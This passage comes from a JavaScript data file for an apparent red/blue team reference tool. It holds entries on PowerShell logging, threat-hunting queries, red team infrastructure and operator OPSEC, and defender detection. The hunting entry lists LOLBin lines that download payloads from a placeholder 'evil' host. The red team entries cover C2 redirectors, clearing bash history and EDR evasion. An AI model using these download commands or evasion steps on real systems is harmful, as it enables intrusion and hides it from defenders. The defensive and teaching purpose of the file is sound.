PipeName="\\\\PSEXESVC*"]\n| table _time, Computer, User, Image, CommandLine, PipeName',
      killchain: 'defense', attack: ['credential-access', 'execution', 'lateral-movement'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-powershell', title: 'PowerShell Logging & Detection', team: 'blue', category: 'winevents',
      description: 'Enable and monitor PowerShell logging: Script Block, Module, Transcription logging, and AMSI events.',
      tags: ['powershell', 'logging', 'detection', 'amsi', 'scriptblock'],
      command: '# ── POWERSHELL LOGGING & DETECTION ──\n\n# ENABLE POWERSHELL LOGGING (Group Policy or Registry)\n\n# Script Block Logging (Event ID 4104)\n# GPO: Computer Config > Admin Templates > Windows Components >\n#      Windows PowerShell > Turn on PowerShell Script Block Logging\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f\n\n# Module Logging (Event ID 4103)\n# Logs pipeline execution details\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames" /v "*" /t REG_SZ /d "*" /f\n\n# Transcription Logging\n# Full session recording to text file\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v EnableTranscripting /t REG_DWORD /d 1 /f\nreg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v OutputDirectory /t REG_SZ /d "C:\\PSTranscripts" /f\n\n# DETECTION PATTERNS:\n# Event 4104 (Script Block) — look for:\n#   - Invoke-Expression (IEX)\n#   - New-Object Net.WebClient\n#   - DownloadString / DownloadFile\n#   - -EncodedCommand / -enc\n#   - [Convert]::FromBase64String\n#   - Invoke-Mimikatz / Invoke-Kerberoast\n#   - Set-MpPreference -DisableRealtimeMonitoring\n#   - AMSI bypass patterns\n\n# AMSI Events (Event ID 1116 in Microsoft-Windows-Windows Defender)\n# Logs when AMSI detects malicious content\n# Even if attacker uses obfuscation, AMSI sees deobfuscated code\n\n# Constrained Language Mode (defense)\n# $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"\n# Blocks: Add-Type, New-Object (COM), reflection, .NET methods',
      killchain: 'defense', attack: ['execution', 'defense-evasion'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-hunting', title: 'Threat Hunting with Windows Events', team: 'blue', category: 'winevents',
      description: 'Proactive threat hunting queries combining multiple event sources to detect advanced attacks and living-off-the-land techniques.',
      tags: ['threat-hunting', 'windows-events', 'detection', 'lolbins'],
      command: '# ── THREAT HUNTING WITH WINDOWS EVENTS ──\n\n# LIVING OFF THE LAND BINARIES (LOLBins)\n# Suspicious processes to monitor:\n# certutil.exe -urlcache -split -f https://evil/payload.exe\n# mshta.exe https://evil/payload.hta\n# regsvr32.exe /s /n /u /i:https://evil/file.sct scrobj.dll\n# rundll32.exe javascript:".."\n# wmic.exe process call create "cmd /c payload"\n# msiexec.exe /q /i https://evil/payload.msi\n# bitsadmin.exe /transfer job https://evil/payload C:\\temp\\payload.exe\n\n# SYSMON QUERY: Detect LOLBin network connections\n# EventCode=3 (Network Connection) where:\n# Image contains: certutil, mshta, regsvr32, rundll32, wmic, msiexec, bitsadmin\n\n# CREDENTIAL DUMPING DETECTION\n# Sysmon Event 10 (ProcessAccess) to lsass.exe\n# TargetImage: C:\\Windows\\System32\\lsass.exe\n# Exclude known: csrss.exe, services.exe, svchost.exe, WerFault.exe\n\n# SCHEDULED TASK PERSISTENCE\n# Security Event 4698 (task created)\n# + Sysmon Event 1 where Image = schtasks.exe\n# Look for: tasks running from Temp, AppData, or with encoded commands\n\n# WMI PERSISTENCE\n# Sysmon Events 19/20/21 (WMI activity)\n# Any WMI event subscription = suspicious unless known IT management tool\n\n# LATERAL MOVEMENT INDICATORS\n# 1. Event 4624 Type 3 (network logon) + Event 4648 (explicit creds)\n# 2. Sysmon Event 1: psexec, wmic /node, winrs, Enter-PSSession\n# 3. Sysmon Event 17/18: Named pipes (PSEXESVC, msagent_, isapi)\n# 4. Event 5140/5145: Admin share access (C$, ADMIN$, IPC$)\n\n# PASS-THE-HASH DETECTION\n# Event 4624 with Logon Type 9 (NewCredentials)\n# + NTLM authentication (not Kerberos)\n# + Source = internal workstation (not DC)\n\n# KERBEROASTING DETECTION\n# Event 4769 (Kerberos Service Ticket)\n# Where: Ticket Encryption Type = 0x17 (RC4-HMAC)\n# And: Service Name != krbtgt\n# Legitimate services use AES; RC4 requests are suspicious',
      killchain: 'defense', attack: ['execution', 'persistence', 'credential-access', 'lateral-movement'], pyramid: 'artifacts', owasp: ['A09'] },

    // ── Red Team OPSEC ──
    { id: 'opsec-infra', title: 'Red Team Infrastructure OPSEC', team: 'red', category: 'opsec',
      description: 'Operational security for red team infrastructure: redirectors, domain fronting, certificate management, and traffic blending.',
      tags: ['opsec', 'infrastructure', 'redirector', 'domain-fronting'],
      command: '# ── RED TEAM INFRASTRUCTURE OPSEC ──\n\n# REDIRECTOR SETUP (traffic relay to hide C2)\n# Use cloud VPS (short-lived, different providers)\n# socat redirect:\nsocat TCP4-LISTEN:443,fork TCP4:C2_SERVER:443\n\n# Apache mod_rewrite redirector:\n# .htaccess rules to filter based on User-Agent, URI, headers\n# Legitimate-looking requests -> C2\n# Everything else -> legitimate site (decoy)\n\n# DOMAIN CATEGORIZATION\n# Buy expired domains with good reputation\n# Check: VirusTotal, Bluecoat, Symantec categorization\n# Re-categorize via vendor submission portals\n# Use domains aged > 6 months with clean history\n\n# CERTIFICATE MANAGEMENT\n# Use Let\'s Encrypt for legitimate-looking certs\n# Match cert CN/SAN to domain categorization\n# Avoid self-signed certs (easy detection)\ncertbot certonly --standalone -d callback.legit-domain.com\n\n# TRAFFIC BLENDING\n# Match C2 traffic to normal HTTPS patterns:\n# - Standard TLS 1.2/1.3 cipher suites\n# - Legitimate User-Agent strings\n# - Normal request intervals (jitter: 30-50%)\n# - Standard HTTP headers (Host, Accept, etc.)\n\n# IP ROTATION\n# Use cloud functions / CDN for callback\n# Azure Functions / AWS Lambda as redirectors\n# Rotate IPs every 24-48 hours\n\n# LOGGING & CLEANUP\n# Log all actions with timestamps\n# Use encrypted channels for team comms\n# Shred temp files: shred -vfz -n 5 tempfile\n# Clear bash history: history -c && history -w',
      killchain: 'c2', attack: ['command-and-control', 'defense-evasion'], pyramid: 'network-infra', owasp: ['A05'] },
    { id: 'opsec-operator', title: 'Operator OPSEC Checklist', team: 'red', category: 'opsec',
      description: 'Personal OPSEC for red team operators: VMs, attribution prevention, communication security, and evidence handling.',
      tags: ['opsec', 'operator', 'attribution', 'vpn', 'vm'],
      command: '# ── OPERATOR OPSEC CHECKLIST ──\n\n# WORKSTATION SETUP\n# [ ] Dedicated pentest VM (snapshot before engagement)\n# [ ] No personal accounts logged in\n# [ ] VPN active (non-attributable provider)\n# [ ] DNS over HTTPS/TLS configured\n# [ ] MAC address randomized\n# [ ] Hostname changed to generic name\nhostnamectl set-hostname workstation\nmacchanger -r eth0\n\n# ATTRIBUTION PREVENTION\n# [ ] Never use personal email/accounts for infra\n# [ ] Separate browser profiles (no cookie leaks)\n# [ ] Use privacy-focused email (ProtonMail) for domain registration\n# [ ] Pay with crypto/prepaid cards for infrastructure\n# [ ] Different IPs for recon vs exploitation\n\n# COMMUNICATION\n# [ ] Encrypted comms with team (Signal, Wire)\n# [ ] No client names in external channels\n# [ ] Use codenames for targets/operations\n# [ ] Separate work and personal devices\n\n# TOOL MANAGEMENT\n# [ ] Compile tools from source (avoid known hashes)\n# [ ] Modify default configs (change default ports, user-agents)\n# [ ] Remove metadata from documents\nexiftool -all= report.pdf\n# [ ] Test tools against target\'s AV/EDR in lab first\n\n# EVIDENCE & REPORTING\n# [ ] Screenshot all findings with timestamps\n# [ ] Log all commands executed (script/tmux logging)\nscript -a ~/pentest-$(date +%Y%m%d).log\n# [ ] Secure evidence storage (encrypted volume)\ncryptsetup luksFormat /dev/sdb1\n# [ ] Chain of custody for sensitive findings\n\n# POST-ENGAGEMENT CLEANUP\n# [ ] Remove all implants/backdoors\n# [ ] Delete test accounts created\n# [ ] Remove uploaded tools from target\n# [ ] Destroy engagement VM\n# [ ] Secure-delete logs after report delivery',
      killchain: 'reconnaissance', attack: ['defense-evasion'], pyramid: 'policies', owasp: ['A05'] },
    { id: 'opsec-detection-evasion', title: 'Detection Evasion Techniques', team: 'red', category: 'opsec',
      description: 'Techniques for evading EDR, SIEM, and SOC monitoring during authorized red team engagements.',
      tags: ['opsec', 'evasion', 'edr', 'siem', 'detection'],
      command: '# ── DETECTION EVASION (AUTHORIZED ENGAGEMENTS) ──\n\n# TIMING & BLENDING\n# Operate during business hours (blend with normal traffic)\n# Match target timezone for activity patterns\n# Use slow scans (nmap -T2 instead of -T4)\n# Space out authentication attempts (avoid lockout thresholds)\n\n# NETWORK EVASION\n# Use HTTPS for all C2 (blend with web traffic)\n# DNS over HTTPS for DNS-based C2\n# Avoid scanning from C2 infrastructure\n# Use separate IPs: recon vs. exploitation vs. C2\n\n# ENDPOINT EVASION\n# Sleep timers with jitter (avoid beacon pattern detection)\n# Vary sleep intervals: 30-300s with 30-50% jitter\n# Use signed binaries (LOLBins) when possible\n# In-memory execution: avoid writing to disk\n# Syscall-level operations to bypass user-mode hooks\n\n# LOG AWARENESS\n# Know what generates events:\n#   - Process creation (Sysmon 1, Security 4688)\n#   - Network connections (Sysmon 3)\n#   - PowerShell (4103, 4104)\n#   - Scheduled tasks (4698)\n# Prefer techniques that generate fewer/noisier events\n\n# CREDENTIAL HANDLING\n# Avoid NTLM when Kerberos is available (NTLM = more logging)\n# Use existing sessions when possible (token impersonation)\n# Overpass-the-hash instead of pass-the-hash\n\n# C2 MALLEABLE PROFILES (Cobalt Strike / Sliver)\n# Match traffic to legitimate services:\n# - Microsoft Teams / Slack API patterns\n# - Google Cloud Storage requests\n# - CDN traffic (Cloudflare, Akamai)\n# Customize JA3/JA3S fingerprints\n# Rotate SSL certificates',
      killchain: 'c2', attack: ['defense-evasion', 'command-and-control'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'opsec-blue', title: 'OPSEC Detection for Defenders', team: 'blue', category: 'opsec',
      description: 'Detect red team OPSEC failures: infrastructure reuse, tool signatures, timing anomalies, and C2 indicators.',
      tags: ['opsec', 'detection', 'threat-intel', 'c2-detection', 'blue-team'],
      command: '# ── DETECTING RED TEAM OPSEC FAILURES ──\n\n# INFRASTRUCTURE INDICATORS\n# Check domain age and reputation:\n# - Recently registered domains (< 30 days)\n# - Domains with minimal web presence\n# - VPS providers commonly used for C2 (DigitalOcean, Linode, Vultr)\n# - JA3 hash mismatches (TLS client fingerprint vs User-Agent)\n\n# TOOL SIGNATURES\n# Default tool indicators:\n# - Cobalt Strike: default EICAR marker, sleep(60000)\n# - Metasploit: default shellcode stubs, named pipes\n# - Sliver: default DNS TXT record patterns\n# - Mimikatz: string patterns even in memory\n\n# Sigma rules for common tools:\n# github.com/SigmaHQ/sigma/tree/master/rules/windows\n\n# TIMING ANALYSIS\n# Regular beacon intervals (even with jitter):\n# - Statistical analysis of connection intervals\n# - Standard deviation too low = automated beaconing\n# - Connections outside business hours from workstations\n\n# NETWORK ANALYSIS\n# - Long-running HTTPS connections (> 10 min)\n# - High volume of DNS TXT queries to single domain\n# - POST requests with large bodies to unknown domains\n# - Certificate transparency monitoring for target domains\n\n# YARA RULES\nrule CobaltStrike_Beacon {\n  strings:\n    $s1 = "%s as %s\\\\%s: %d" ascii\n    $s2 = "beacon.dll" ascii\n    $s3 = "ReflectiveLoader" ascii\n  condition:\n    2 of them\n}\n\n# HONEYTOKENS\n# Place fake credentials in:\n# - LSASS memory (canary accounts)\n# - Network shares (fake documents with tracking)\n# - Git repos (fake API keys with alerting)\n# - DNS (canary tokens: canarytokens.org)',
      killchain: 'defense', attack: ['command-and-control', 'defense-evasion'], pyramid: 'tools', owasp: ['A09'] },
  ];
